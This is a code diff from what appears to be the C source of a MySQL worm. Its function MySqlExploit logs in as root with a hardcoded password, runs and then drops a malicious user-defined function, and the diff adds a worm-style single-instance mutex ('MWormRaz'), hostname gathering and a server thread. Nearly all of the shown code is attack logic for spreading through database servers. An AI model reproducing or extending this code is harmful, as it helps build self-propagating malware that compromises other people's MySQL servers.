@@ -88,13 +88,13 @@ void MySqlExploit(char *host,char *root,char *pwd)
 		unsigned long version;
 
 		if (!mysql_real_connect(&mysql,
-			"127.0.0.1",		// host
-			"root",				// user
-			"cc",				// password
-			NULL,				// db name, NULL = default
-			0,					// port, 0 = default
-			NULL,				// unix_socket, use socket or pipe if not NULL
-			0))					// normally 0	
+								"127.0.0.1",		// host
+								"root",				// user
+								"cc",				// password
+								NULL,				// db name, NULL = default
+								0,					// port, 0 = default
+								NULL,				// unix_socket, use socket or pipe if not NULL
+								0))					// normally 0	
 		{
 			fprintf(stderr,"Failed to connect to database: Error: %s\n",mysql_error(&mysql));
 			__leave;
@@ -127,7 +127,8 @@ void MySqlExploit(char *host,char *root,char *pwd)
 			__leave;
 
 		printf("Run udf function...\n");
-		if (!doQuery(result,"select myfunc_test()"))
+		sprintf_s(query,QUERY_LENGTH,"select myfunc_test('%s')",name);
+		if (!doQuery(result,query))
 			printf("Run udf function failed...!\n");
 
 		printf("drop udf function...\n");
@@ -215,9 +216,30 @@ BOOL InitSocket()
 
 int _tmain(int argc, _TCHAR* argv[])
 {	
+	HANDLE hMutex;
+	char szHostName[128] = {0};
+	SetLastError(ERROR_SUCCESS);
+	hMutex = CreateMutexA(NULL,FALSE,"MWormRaz");
+	if (hMutex == NULL)
+	{			
+		return -1;
+	}
+
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		return 0;
+	}
+
 	InitSocket();
+	if (gethostname(szHostName,sizeof(szHostName)))
+	{
+		printf("gethostname error:%d",WSAGetLastError());
+		return 0;
+	}
+
 	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)runServer,NULL,0,NULL);
 	mysql_init(&mysql);
+
 
 	do 
 	{
@@ -229,6 +251,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	mysql_library_end();
 	
 	wait();
+	CloseHandle(hMutex);
 	return 0;
 }
 
